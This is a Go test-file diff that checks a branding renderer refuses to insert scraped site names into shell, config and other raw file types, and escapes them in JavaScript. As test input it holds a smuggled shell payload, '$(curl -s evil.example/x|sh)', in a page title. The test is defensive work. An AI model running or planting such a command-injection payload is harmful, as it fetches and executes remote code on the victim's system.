@@ -1,6 +1,7 @@
 package brand
 
 import (
+	"net/url"
 	"strings"
 	"testing"
 )
@@ -52,7 +53,38 @@ func TestContextHouseDefaults(t *testing.T) {
 	if v["name"] != "Acme demo" || v["tagline"] != "Ready for calls" || v["primary"] != DefaultPrimary || v["accent"] != DefaultAccent || v["slug"] != "default" || v["logo"] != "" {
 		t.Fatalf("house defaults: %v", v)
 	}
-	if ModeForFile("/srv/brand/brand.css") != CSS || ModeForFile("x.HTML") != HTML || ModeForFile("a.js") != JSON || ModeForFile("seed.sql") != SQL || ModeForFile("notes") != Raw {
+	mode := func(name string) Mode { m, _ := ModeForFile(name); return m }
+	if mode("/srv/brand/brand.css") != CSS || mode("x.HTML") != HTML || mode("a.js") != JSON || mode("seed.sql") != SQL {
 		t.Fatal("mode for file")
+	}
+	if _, ok := ModeForFile("notes"); ok {
+		t.Fatal("a file with no extension has a mode")
+	}
+}
+
+// A name fetched from a prospect's site lands in file content. A file type
+// with no escaping mode must fail the render, not insert it raw.
+func TestRenderFileRefusesRawTypes(t *testing.T) {
+	base, _ := url.Parse("https://evil.example/")
+	p := ParsePage(base, []byte(`<html><head><title>Acme $(curl -s evil.example/x|sh) `+"`id`"+`; name: [x]</title></head></html>`))
+	v := Context(&Kit{Slug: "evil", Name: p.Name, Domain: "evil.example"}, "", "", "", "", "")
+	for _, f := range []string{"seed.sh", "app.env", "compose.yml", "compose.yaml", "default.conf", "seed.py", "notes.txt", "README.md", "Dockerfile", "/srv/x/run"} {
+		out, err := v.RenderFile("echo {{brand.name}}", f)
+		if err == nil || !strings.Contains(err.Error(), "GREENROOM_BRAND_") || !strings.Contains(err.Error(), ".json") {
+			t.Errorf("%s: rendered %q (%v)", f, out, err)
+		}
+	}
+	if out, err := v.RenderFile("echo plain", "seed.sh"); err != nil || out != "echo plain" {
+		t.Fatalf("a file without placeholders: %q %v", out, err)
+	}
+	for _, f := range []string{"app.js", "data.json", "mod.mjs"} {
+		out, err := v.RenderFile("const n = `{{brand.name}}`;", f)
+		if err != nil || strings.Contains(out[11:len(out)-2], "`") || strings.Contains(out, "$(") ||
+			!strings.Contains(out, `\u0060id`) || !strings.Contains(out, `\u0024(curl`) {
+			t.Errorf("%s: template literal break out: %q %v", f, out, err)
+		}
+	}
+	if out, err := v.Render("{{brand.name}}", Raw); err != nil || !strings.Contains(out, "$(curl") {
+		t.Fatalf("argv stays raw: %q %v", out, err)
 	}
 }
